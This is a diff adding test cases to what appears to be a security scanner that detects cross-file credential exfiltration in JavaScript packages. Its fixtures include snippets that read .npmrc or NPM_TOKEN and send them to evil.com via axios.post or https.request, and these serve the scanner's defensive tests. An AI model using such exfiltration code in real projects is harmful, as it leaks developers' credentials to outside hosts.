@@ -1585,6 +1585,95 @@ async function runModuleGraphTests() {
     assert(rootOf('net.connect(p, h)') === 'net', 'net.connect -> net');
     assert(rootOf('this.sender.send(x)') === null, 'this.sender.send -> null (non-Identifier root)');
   });
+
+  // Axios extension (chantier 2026-06): axios.get/post/... is a recognized cross-file network sink.
+  test('module-graph: axios.post of tainted data IS a cross-file network sink', () => {
+    const tmp = makeTmpDir();
+    try {
+      writeFile(tmp, 'reader.js', `
+        const fs = require('fs');
+        module.exports = { read() { return fs.readFileSync('.npmrc', 'utf8'); } };
+      `);
+      writeFile(tmp, 'sender.js', `
+        const axios = require('axios');
+        module.exports = { send(data) { axios.post('https://evil.com/c', data); } };
+      `);
+      writeFile(tmp, 'index.js', `
+        const reader = require('./reader');
+        const sender = require('./sender');
+        const d = reader.read();
+        sender.send(d);
+      `);
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+      const sinks = annotateSinkExports(graph, tmp);
+      assert(sinks['sender.js'] && sinks['sender.js'].send && /axios/.test(sinks['sender.js'].send.sink),
+        `axios.post must be annotated as a sink export, got ${JSON.stringify(sinks['sender.js'])}`);
+      const flows = detectCrossFileFlows(graph, tainted, sinks, tmp);
+      assert(flows.length > 0, `axios.post of a credential must flag a cross-file flow, got ${flows.length}`);
+    } finally {
+      cleanup(tmp);
+    }
+  });
+
+  // Source-precision (segment A): config/URL env vars are not credential taint sources — aligns
+  // module-graph with dataflow.js isSensitiveEnv (DF-C4). Credential vars + whole-env dumps stay.
+  test('module-graph: config env var (process.env.STORYBOARD_SERVER_URL) is NOT a credential source', () => {
+    const tmp = makeTmpDir();
+    try {
+      writeFile(tmp, 'cfg.js', `module.exports = { url() { return process.env.STORYBOARD_SERVER_URL; } };`);
+      writeFile(tmp, 'sender.js', `const https = require('https'); module.exports = { send(u) { https.get(u + '/collect'); } };`);
+      writeFile(tmp, 'index.js', `
+        const cfg = require('./cfg');
+        const sender = require('./sender');
+        const u = cfg.url();
+        sender.send(u);
+      `);
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+      assert(!tainted['cfg.js'] || Object.keys(tainted['cfg.js']).length === 0,
+        `config URL env var must not be a tainted source, got ${JSON.stringify(tainted['cfg.js'])}`);
+      const flows = detectCrossFileFlows(graph, tainted, annotateSinkExports(graph, tmp), tmp);
+      assert(flows.length === 0, `config URL → network is not credential exfil, expected 0 flows, got ${flows.length}`);
+    } finally {
+      cleanup(tmp);
+    }
+  });
+
+  test('module-graph: credential env var (NPM_TOKEN) IS still a taint source + flows (FN guard)', () => {
+    const tmp = makeTmpDir();
+    try {
+      writeFile(tmp, 'cred.js', `module.exports = { tok() { return process.env.NPM_TOKEN; } };`);
+      writeFile(tmp, 'sender.js', `const https = require('https'); module.exports = { send(t) { https.request({ hostname: 'evil.com' }, () => {}).end(t); } };`);
+      writeFile(tmp, 'index.js', `
+        const cred = require('./cred');
+        const sender = require('./sender');
+        const t = cred.tok();
+        sender.send(t);
+      `);
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+      assert(tainted['cred.js'] && tainted['cred.js'].tok && tainted['cred.js'].tok.tainted,
+        'NPM_TOKEN must remain a credential taint source');
+      const flows = detectCrossFileFlows(graph, tainted, annotateSinkExports(graph, tmp), tmp);
+      assert(flows.length > 0, `NPM_TOKEN → network must still flag, got ${flows.length}`);
+    } finally {
+      cleanup(tmp);
+    }
+  });
+
+  test('module-graph: whole process.env dump remains a taint source (config-gate keeps dump)', () => {
+    const tmp = makeTmpDir();
+    try {
+      writeFile(tmp, 'dump.js', `module.exports = { all() { const e = process.env; return e; } };`);
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+      assert(tainted['dump.js'] && tainted['dump.js'].all && tainted['dump.js'].all.tainted,
+        'whole process.env dump must remain tainted (env exfil)');
+    } finally {
+      cleanup(tmp);
+    }
+  });
 }
 
 module.exports = { runModuleGraphTests };
